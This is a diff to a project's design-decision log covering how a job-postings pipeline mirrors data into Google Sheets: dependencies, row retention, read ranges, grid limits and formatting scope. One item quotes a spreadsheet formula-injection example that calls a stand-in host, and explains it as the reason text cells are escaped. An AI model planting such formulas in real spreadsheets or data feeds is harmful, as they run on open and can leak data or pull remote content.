@@ -332,3 +332,72 @@ writes them together so a caller cannot update one and leave the other
 disagreeing about what is live, and `tests/test_workflows.py` asserts every
 regenerated path is in the workflow's `git add` line — a generated file that
 is never staged looks green and stays stale.
+
+---
+
+## Phase E — Sheets mirror
+
+### E1 — `google-auth` for credentials, plain `requests` for the API
+The full `google-api-python-client` would add a discovery layer and a second
+HTTP stack for four endpoints. `google-auth` alone pulls `cryptography` and two
+small ASN.1 packages: ~32 MB installed, ~4s cold and near zero against the
+workflow's pip cache. Signing a service-account JWT by hand would save the
+dependency and is not a thing to hand-roll.
+
+### E2 — Rows are never deleted from the Live tab
+An expired posting stops being updated and keeps its row. Deleting it would
+take the notes beside it, and those are the only data in this system with no
+upstream copy. The tab grows; that is what filtering is for.
+
+### E3 — `USER_ENTERED`, therefore escaping
+The date column has to arrive as a date rather than text, which needs
+`USER_ENTERED`, which evaluates anything beginning `= + - @`. Company names and
+job titles come from third-party feeds straight into a spreadsheet the user
+opens, so a title of `=IMPORTXML("http://evil.test","//x")` would run on open.
+Every text cell is prefixed with an apostrophe when it starts with a formula
+character — Sheets' own "this is text" marker, not displayed. The same escaping
+runs on the backlog import, which is exactly when nobody is watching.
+
+### E4 — The extent read is `A:J`, not `A:A`
+Sheets truncates trailing empty rows from a response, so reading column A alone
+reports the last row *the pipeline* filled. A row the user added below it, with
+a note in column I and nothing in A, is invisible to that read and the append
+lands on top of it. The note survives — nothing writes past H — but it ends up
+beside a posting he never chose, which is worse than losing it because it looks
+correct. Found by probing, not by a fixture.
+
+### E5 — Grid capacity is a hard ceiling, so it is reported before it bites
+Sheets rejects a write past the last grid row rather than growing the tab. A
+new spreadsheet is 1,000 rows; at ~70 new postings a day that is eight days.
+`sheets setup` grows Live to 20,000 with `appendDimension` — which can only add
+rows, unlike setting `gridProperties.rowCount`, which is a resize and can
+therefore shrink, and a shrink deletes what was in the rows it removes. A run
+sets `room_low` under 500 spare rows.
+
+### E6 — Backpressure cannot currently suppress anything, and the read still fails open
+Worth recording because it looks otherwise: `decide()` sends tier 2 to the
+digest whether or not `backpressure` is set, so a stale backlog count changes a
+reason string and nothing else today. The fail-open design does not lean on
+that — if tier 2 ever gains a push condition, a Sheets outage must still not be
+able to suppress it.
+
+### E7 — `data/sheet-status.json` is committed
+It is the last known copy of the user's status column, so a Sheets outage in CI
+degrades the backlog count to "stale" rather than "empty". It is never
+authoritative: the spreadsheet is. It does not weaken the
+`data/applications.jsonl` invariant — that file remains local and read-only to
+the pipeline — but it is the second place application status now lives, and the
+repo must stay private.
+
+### E8 — Conditional formatting is scoped to A-H
+The rules read the user's columns I and J and colour only A-H. Formatting a
+range is not writing to it, but a background colour the pipeline applied to a
+notes column is still the pipeline having changed something it does not own.
+For the same reason there is no data-validation dropdown on the status column,
+which would otherwise be the nicer prompt.
+
+### E9 — The backlog import is a command, not part of a run
+`data/backlog-review.csv` is gitignored and therefore absent in CI. It is also
+a frozen snapshot with no ids to match on, so it is written as a block — which
+is safe exactly once and would silently re-associate any notes the user had
+added if it were re-run against a different ordering.
